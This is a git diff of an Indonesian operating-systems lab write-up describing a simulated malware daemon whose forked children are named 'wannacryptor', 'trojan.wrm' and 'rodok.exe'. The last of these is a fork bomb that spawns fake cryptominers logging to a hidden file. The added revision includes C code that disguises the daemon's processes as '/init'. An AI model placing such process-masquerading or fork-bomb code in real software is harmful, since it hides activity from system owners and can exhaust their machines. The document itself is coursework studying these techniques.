@@ -733,6 +733,9 @@ void start_trojan() {
 ```
 Thread `loop_replicate` akan dijalankan oleh proses anak yang dinamai `trojan.wrm`.
 
+Output:
+![runme](assets/trojan.png)
+
 ### D. Fitur ketiga bernama rodok.exe dirancang untuk menjalankan fork bomb, yaitu proses yang akan membuat banyak proses anak secara terus-menerus. Namun berbeda dari fork bomb biasa, setiap proses yang dibuat oleh rodok.exe berperan sebagai cryptominer palsu yang secara berkala menulis hash acak ke dalam log file.
 
 ```
@@ -782,6 +785,80 @@ void *mine_crafter(void *arg) {
 - Setiap proses `mine-crafter-<id>` akan menghasilkan hash acak sepanjang 64 karakter hex.
 - Hasil hash akan disimpan di file log tersembunyi: `/tmp/.miner.log`.
 - Setiap hash dicatat bersamaan dengan timestamp dan ID proses miner.
+
+Output:
+![miner.log](assets/miner.log.png)
+
+### REVISI SOAL_3
+#### revisi struktur
+menambahkan fungsi `rename_process` untuk menyamarkan proses daemon menjadi `/init`, beserta anaknya. Awalnya memakai `prctl(PR_SET_NAME, "/init");` langsung tetapi tidak berubah menjadi `/init`
+
+Berikut revisi codenya 
+
+```
+void rename_process(const char *name, char *argv[]) {
+    prctl(PR_SET_NAME, name, 0, 0, 0);
+
+    size_t total_len = 0;
+    for (int i = 0; argv[i]; ++i)
+        total_len += strlen(argv[i]) + 1;
+    for (int i = 0; environ[i]; ++i)
+        total_len += strlen(environ[i]) + 1;
+
+    memset(argv[0], 0, total_len);
+    strncpy(argv[0], name, total_len - 1);
+    argv[1] = NULL;
+}
+
+int main(int argc, char *argv[]) {
+    srand(time(NULL));
+    time_t t = time(NULL);
+    asprintf(&timestamp_key, "%ld", t);
+
+    daemonize(argv);
+
+    pid_t pid1 = fork();
+    if (pid1 == 0) {
+        rename_process("wannacryptor", argv);
+        start_wannacryptor();
+        exit(0);
+    }
+
+    pid_t pid2 = fork();
+    if (pid2 == 0) {
+        rename_process("trojan.wrm", argv);
+        start_trojan();
+        exit(0);
+    }
+
+    pid_t pid3 = fork();
+    if (pid3 == 0) {
+        rename_process("rodok.exe", argv);
+        start_rodok(argc, argv);
+        exit(0);
+    }
+
+    while (1) pause();
+    return 0;
+}
+```
+
+Hasil Revisi
+Before:
+![struktur awal](assets/revisi_struktur.png)
+
+After:
+![Filtered](assets/revisi_struktur_1.png)
+
+#### Revisi wannacryptor untuk zip folder di directory (kelompok genap)
+Hasil Revisi
+![zip folder](assets/zip.png)
+
+#### Revisi membunuh rodok.exe maka proses anaknya (mine-crafter) juga ikut berhenti
+Hasil Revisi
+
+After:
+![rodok after](assets/pkill_rodok.exe.png.png)
 
 ## Soal_4
 
